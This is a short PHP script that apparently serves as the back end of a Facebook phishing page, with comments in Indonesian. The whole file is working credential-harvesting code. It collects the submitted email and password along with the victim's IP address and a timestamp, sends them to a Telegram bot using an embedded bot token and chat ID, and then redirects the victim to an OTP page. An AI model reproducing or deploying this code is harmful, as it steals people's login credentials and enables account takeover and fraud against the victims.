<?php
$botToken = "8705924996:AAHEN-385TwKuya-RASri6ttIjIsfYvqeaU";        // Ganti dengan Bot Token Telegram kamu
$chatID = "8509633837";            // Ganti dengan Chat ID kamu

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $pass = $_POST['pass'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date("Y-m-d H:i:s");

    $message = "🔥 *NEW FACEBOOK LOGIN* 🔥\n\n";
    $message .= "📧 Email: `$email`\n";
    $message .= "🔑 Password: `$pass`\n";
    $message .= "🌐 IP: `$ip`\n";
    $message .= "⏰ Time: `$time`\n";

    // Kirim ke Telegram
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&parse_mode=Markdown&text=" . urlencode($message));

    // Redirect ke OTP page
    header("Location: otp.html");
    exit();
}
?>